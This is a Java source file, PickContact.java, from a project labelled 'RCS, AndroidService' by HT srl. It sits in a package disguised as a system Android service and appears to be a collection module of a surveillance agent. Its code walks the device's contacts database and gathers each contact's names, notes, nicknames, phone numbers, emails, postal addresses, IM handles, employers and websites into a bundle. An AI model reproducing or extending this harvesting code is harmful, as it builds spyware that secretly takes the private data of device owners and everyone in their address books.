/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, AndroidService
 * File         : PickContact.java
 * Created      : 6-mag-2011
 * Author		: zeno
 * *******************************************/

package com.android.service.agent.task;

import java.util.ArrayList;
import java.util.LinkedList;
import java.util.List;
import java.util.ListIterator;

import android.content.ContentResolver;
import android.database.Cursor;
import android.provider.ContactsContract;
import android.provider.ContactsContract.CommonDataKinds.Email;
import android.provider.ContactsContract.CommonDataKinds.Nickname;
import android.provider.ContactsContract.CommonDataKinds.Note;
import android.provider.ContactsContract.CommonDataKinds.Phone;

import com.android.service.Status;

public class PickContact {
	private static final String TAG = "PickContact";

	private List<PhoneInfo> loadUserPhones(ContentResolver cr) {
		
		Cursor cursor = cr.query(ContactsContract.Contacts.CONTENT_URI, null, null, null, null);
		int size = cursor.getCount();
		List<PhoneInfo> list = new ArrayList<PhoneInfo>(size);

		while (cursor.moveToNext()) {
			long userId = cursor.getLong(cursor.getColumnIndex(ContactsContract.Contacts._ID));
			long hasPhone = cursor.getLong(cursor.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER));

			if (hasPhone > 0) {
				String phoneWhere = Phone.CONTACT_ID + " = ? ";
				String[] phoneWhereParams = new String[] { userId + "" };
				Cursor phoneCursor = cr.query(Phone.CONTENT_URI, null, phoneWhere, phoneWhereParams, null);

				while (phoneCursor.moveToNext()) {
					int phoneType = phoneCursor.getInt(phoneCursor.getColumnIndex(Phone.TYPE));

					String phoneValue = phoneCursor.getString(phoneCursor.getColumnIndex(Phone.NUMBER));

					list.add(new PhoneInfo(userId, phoneType, phoneValue));
				}

				phoneCursor.close();
			}
		}

		cursor.close();
		return list;
	}

	private List<EmailInfo> loadUserEmails(ContentResolver cr) {
		Cursor cursor = cr.query(ContactsContract.Contacts.CONTENT_URI, null, null, null, null);
		int size = cursor.getCount();
		List<EmailInfo> list = new ArrayList<EmailInfo>(size);

		while (cursor.moveToNext()) {
			long userId = cursor.getLong(cursor.getColumnIndex(ContactsContract.Contacts._ID));

			Cursor emailCur = cr.query(Email.CONTENT_URI, null, Email.CONTACT_ID + " = ?",
					new String[] { userId + "" }, null);

			while (emailCur.moveToNext()) {
				String email = emailCur.getString(emailCur.getColumnIndex(Email.DATA));
				int emailType = emailCur.getInt(emailCur.getColumnIndex(Email.TYPE));

				list.add(new EmailInfo(userId, emailType, email));
			}

			emailCur.close();
		}

		cursor.close();
		return list;
	}

	private List<UserInfo> loadUserInfos(ContentResolver cr) {
		
		Cursor cursor = cr.query(ContactsContract.Contacts.CONTENT_URI, null, null, null, null);
		int size = cursor.getCount();
		List<UserInfo> list = new ArrayList<UserInfo>(size);

		while (cursor.moveToNext()) {
			String userNote = null;
			String userNickName = null;

			String userName = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));
			long userId = cursor.getLong(cursor.getColumnIndex(ContactsContract.Contacts._ID));

			String noteWhere = ContactsContract.Data.CONTACT_ID + " = ? AND " + ContactsContract.Data.MIMETYPE + " = ?";
			String[] noteWhereParams = new String[] { userId + "", Note.CONTENT_ITEM_TYPE };

			Cursor noteCur = cr.query(ContactsContract.Data.CONTENT_URI, null, noteWhere, noteWhereParams, null);

			if (noteCur.moveToFirst()) {
				userNote = noteCur.getString(noteCur.getColumnIndex(ContactsContract.CommonDataKinds.Note.NOTE));
			}

			noteCur.close();

			String nickNameWhere = ContactsContract.Data.CONTACT_ID + " = ? AND " + ContactsContract.Data.MIMETYPE
					+ " = ?";

			String[] nickNameWhereParams = new String[] { userId + "", Nickname.CONTENT_ITEM_TYPE };

			Cursor nickCursor = cr.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, nickNameWhere,
					nickNameWhereParams, null);

			if (nickCursor.moveToFirst()) {
				userNickName = nickCursor.getString(nickCursor
						.getColumnIndex(ContactsContract.CommonDataKinds.Nickname.NAME));
			}

			nickCursor.close();
			list.add(new UserInfo(userId, userName, userNote, userNickName));
		}

		cursor.close();
		return list;
	}

	private List<PostalAddressInfo> loadUserPA(ContentResolver cr) {
		Cursor cursor = cr.query(ContactsContract.Contacts.CONTENT_URI, null, null, null, null);
		int size = cursor.getCount();
		List<PostalAddressInfo> list = new ArrayList<PostalAddressInfo>(size);

		while (cursor.moveToNext()) {
			long userId = cursor.getLong(cursor.getColumnIndex(ContactsContract.Contacts._ID));
			String addrWhere = ContactsContract.Data.CONTACT_ID + " = ? AND " + ContactsContract.Data.MIMETYPE + " = ?";

			String[] addrWhereParams = new String[] { userId + "",
					ContactsContract.CommonDataKinds.StructuredPostal.CONTENT_ITEM_TYPE };

			Cursor addrCur = cr.query(ContactsContract.Data.CONTENT_URI, null, addrWhere, addrWhereParams, null);

			while (addrCur.moveToNext()) {
				String poBox = addrCur.getString(addrCur
						.getColumnIndex(ContactsContract.CommonDataKinds.StructuredPostal.POBOX));
				String street = addrCur.getString(addrCur
						.getColumnIndex(ContactsContract.CommonDataKinds.StructuredPostal.STREET));
				String city = addrCur.getString(addrCur
						.getColumnIndex(ContactsContract.CommonDataKinds.StructuredPostal.CITY));
				String state = addrCur.getString(addrCur
						.getColumnIndex(ContactsContract.CommonDataKinds.StructuredPostal.REGION));
				String postalCode = addrCur.getString(addrCur
						.getColumnIndex(ContactsContract.CommonDataKinds.StructuredPostal.POSTCODE));
				String country = addrCur.getString(addrCur
						.getColumnIndex(ContactsContract.CommonDataKinds.StructuredPostal.COUNTRY));
				String neighbor = addrCur.getString(addrCur
						.getColumnIndex(ContactsContract.CommonDataKinds.StructuredPostal.NEIGHBORHOOD));
				int type = addrCur.getInt(addrCur
						.getColumnIndex(ContactsContract.CommonDataKinds.StructuredPostal.TYPE));
				
				list.add(new PostalAddressInfo(userId, type, street, poBox, neighbor, city, state, postalCode, country));
			}

			addrCur.close();
		}

		cursor.close();
		return list;
	}

	private List<ImInfo> loadUserIm(ContentResolver cr) {
		Cursor cursor = cr.query(ContactsContract.Contacts.CONTENT_URI, null, null, null, null);
		int size = cursor.getCount();
		List<ImInfo> list = new ArrayList<ImInfo>(size);

		while (cursor.moveToNext()) {
			long userId = cursor.getLong(cursor.getColumnIndex(ContactsContract.Contacts._ID));

			String imWhere = ContactsContract.Data.CONTACT_ID + " = ? AND " + ContactsContract.Data.MIMETYPE + " = ? ";
			String[] imWhereParams = new String[] { userId + "", ContactsContract.CommonDataKinds.Im.CONTENT_ITEM_TYPE };
			Cursor imCursor = cr.query(ContactsContract.Data.CONTENT_URI, null, imWhere, imWhereParams, null);

			while (imCursor.moveToNext()) {
				int imType = imCursor.getInt(imCursor.getColumnIndex(ContactsContract.CommonDataKinds.Im.PROTOCOL));
				String imValue = imCursor.getString(imCursor.getColumnIndex(ContactsContract.CommonDataKinds.Im.DATA));

				list.add(new ImInfo(userId, imType, imValue));
			}

			imCursor.close();
		}

		cursor.close();
		return list;
	}

	private List<OrganizationInfo> loadUserOrg(ContentResolver cr) {
		Cursor cursor = cr.query(ContactsContract.Contacts.CONTENT_URI, null, null, null, null);
		int size = cursor.getCount();
		List<OrganizationInfo> list = new ArrayList<OrganizationInfo>(size);

		while (cursor.moveToNext()) {
			int userId = cursor.getInt(cursor.getColumnIndex(ContactsContract.Contacts._ID));

			String orgWhere = ContactsContract.Data.CONTACT_ID + " = ? AND " + ContactsContract.Data.MIMETYPE + " = ? ";
			String[] orgWhereParams = new String[] { userId + "",
					ContactsContract.CommonDataKinds.Organization.CONTENT_ITEM_TYPE };

			Cursor orgCursor = cr.query(ContactsContract.Data.CONTENT_URI, null, orgWhere, orgWhereParams, null);

			while (orgCursor.moveToNext()) {
				String companyName = orgCursor.getString(orgCursor
						.getColumnIndex(ContactsContract.CommonDataKinds.Organization.DATA));
				String companyTitle = orgCursor.getString(orgCursor
						.getColumnIndex(ContactsContract.CommonDataKinds.Organization.TITLE));
				int type = orgCursor.getInt(orgCursor
						.getColumnIndex(ContactsContract.CommonDataKinds.Organization.TYPE));

				list.add(new OrganizationInfo(userId, type, companyName, companyTitle));
			}

			orgCursor.close();
		}

		cursor.close();
		return list;
	}

	private List<WebsiteInfo> loadUserWebsite(ContentResolver cr) {
		Cursor cursor = cr.query(ContactsContract.Contacts.CONTENT_URI, null, null, null, null);
		int size = cursor.getCount();
		List<WebsiteInfo> list = new ArrayList<WebsiteInfo>(size);

		while (cursor.moveToNext()) {
			long userId = cursor.getInt(cursor.getColumnIndex(ContactsContract.Contacts._ID));
			String websiteWhere = ContactsContract.Data.CONTACT_ID + " = ? AND " + ContactsContract.Data.MIMETYPE
					+ " = ? ";
			String[] websiteWhereParams = new String[] { userId + "",
					ContactsContract.CommonDataKinds.Website.CONTENT_ITEM_TYPE };

			Cursor webCursor = cr
					.query(ContactsContract.Data.CONTENT_URI, null, websiteWhere, websiteWhereParams, null);

			while (webCursor.moveToNext()) {
				String websiteName = webCursor.getString(webCursor
						.getColumnIndex(ContactsContract.CommonDataKinds.Website.URL));
				
				list.add(new WebsiteInfo(userId, websiteName));
			}

			webCursor.close();
		}

		cursor.close();
		return list;
	}

	public List<Contact> getContactInfo() {
		ContentResolver cr = Status.getAppContext().getContentResolver();

		List<UserInfo> listUser = loadUserInfos(cr);
		List<EmailInfo> listEmail = loadUserEmails(cr);
		List<PostalAddressInfo> listPa = loadUserPA(cr);
		List<PhoneInfo> listPhone = loadUserPhones(cr);
		List<ImInfo> listIm = loadUserIm(cr);
		List<OrganizationInfo> listOrganization = loadUserOrg(cr);
		List<WebsiteInfo> listWebsite = loadUserWebsite(cr);

		// Compila la lista di ogni singolo contatto
		List<Contact> list = new ArrayList<Contact>();
		
		ListIterator<UserInfo> iter = listUser.listIterator();
	
		while (iter.hasNext()) {
			UserInfo user = iter.next();
			
			Contact c = new Contact(user);
   
			long id = user.getUserId();
			
			// Email Info
			ListIterator<EmailInfo> e = listEmail.listIterator();
			
			while (e.hasNext()) {
				EmailInfo einfo = e.next();
				
				if (einfo.getUserId() == id) {
					c.add(einfo);
				}
			}
			
			// Postal Address Info
			ListIterator<PostalAddressInfo> p = listPa.listIterator();
			
			while (p.hasNext()) {
				PostalAddressInfo pinfo = p.next();
				
				if (pinfo.getUserId() == id) {
					c.add(pinfo);
				}
			}
			
			// Phone Info
			ListIterator<PhoneInfo> po = listPhone.listIterator();
			
			while (po.hasNext()) {
				PhoneInfo poinfo = po.next();
				
				if (poinfo.getUserId() == id) {
					c.add(poinfo);
				}
			}
			
			// Im Info
			ListIterator<ImInfo> im = listIm.listIterator();
			
			while (im.hasNext()) {
				ImInfo iminfo = im.next();
				
				if (iminfo.getUserId() == id) {
					c.add(iminfo);
				}
			}
			
			// Organization Info
			ListIterator<OrganizationInfo> o = listOrganization.listIterator();
			
			while (o.hasNext()) {
				OrganizationInfo oinfo = o.next();
				
				if (oinfo.getUserId() == id) {
					c.add(oinfo);
				}
			}
			
			// Webiste Info
			ListIterator<WebsiteInfo> w = listWebsite.listIterator();
			
			while (w.hasNext()) {
				WebsiteInfo winfo = w.next();
				
				if (winfo.getUserId() == id) {
					c.add(winfo);
				}
			}
			
			// c.print();
			list.add(c);
		}
		
		return list;
	}
}
